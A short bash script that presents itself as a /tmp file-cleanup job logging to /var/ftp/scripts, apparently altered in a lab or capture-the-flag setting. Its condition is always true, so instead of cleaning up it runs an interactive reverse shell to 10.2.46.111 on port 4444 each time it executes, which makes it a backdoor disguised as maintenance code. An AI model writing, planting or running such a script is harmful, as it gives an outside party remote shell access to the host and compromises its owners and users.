#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
	bash -i >& /dev/tcp/10.2.46.111/4444 0>&1
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
